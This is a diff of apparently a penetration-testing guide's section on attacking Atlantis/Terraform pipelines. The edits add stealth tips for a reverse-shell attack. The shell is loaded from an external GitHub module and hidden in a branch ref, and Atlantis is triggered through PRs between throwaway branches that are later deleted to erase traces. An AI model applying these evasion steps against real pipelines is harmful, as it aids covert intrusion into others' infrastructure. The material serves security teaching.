@@ -189,7 +189,11 @@ data "external" "example" {
 }
 ```
 
-You can perform this attack even in a **more stealth way**, instead of adding the rev shell directly into the terraform file, you can **load an external resource** that contains the rev shell:
+#### Stealthier Attack
+
+You can perform this attack even in a **stealthier way**, by following this suggestions:
+
+* Instead of adding the rev shell directly into the terraform file, you can **load an external resource** that contains the rev shell:
 
 ```javascript
 module "not_rev_shell" {
@@ -199,7 +203,8 @@ module "not_rev_shell" {
 
 You can find the rev shell code in [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)
 
-For an even **more stealth attack** you can use the **ref** feature to hide the **terraform rev shell code in a branch** inside of the repo, something like: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`
+* In the external resource, use the **ref** feature to hide the **terraform rev shell code in a branch** inside of the repo, something like: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`
+* **Instead** of creating a **PR to master** to trigger Atlantis, **create 2 branches** (test1 and test2) and create a **PR from one to the other**. When you have completed the attack, just **remove the PR and the branches**.
 
 ### Atlantis apply RCE - Config modification in new PR
 
@@ -231,7 +236,7 @@ resource "null_resource" "rev_shell" {
 }
 ```
 
-As in the previous exploitation technique you could probably **load an external resource instead of writing the malicious payload** directly in the terraform file.
+Follow the **suggestions from the previous technique** the perform this attack in a **stealthier way**.
 
 ### Terraform Param Injection
 
